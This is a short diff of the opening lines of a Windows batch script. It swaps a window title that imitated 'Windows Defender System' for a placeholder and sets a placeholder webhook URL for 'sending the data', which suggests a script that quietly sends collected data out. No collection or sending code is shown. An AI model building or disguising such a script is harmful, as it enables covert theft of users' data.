@@ -1,6 +1,7 @@
 :: READ THE README.txt FILE BEFORE USING THIS SCRIPT. IT CONTAINS IMPORTANT INFORMATION ABOUT THE SCRIPT'S FUNCTIONALITY AND POTENTIAL RISKS.
 @echo off
-title Windows Defender System
+:: Reemplace the variable "PUT_THE_WINDOW_TITLE_THAT_YOU_WANT" with the title you want that apears in the cmd window.
+title "PUT_THE_WINDOW_TITLE_THAT_YOU_WANT"
 
 :: Reemplace the variable "YOUR_WEBHOOK_URL_GOES_HERE" with the actual webhook URL you want to use for sending the data.
 set "WEBHOOK=YOUR_WEBHOOK_URL_GOES_HERE"
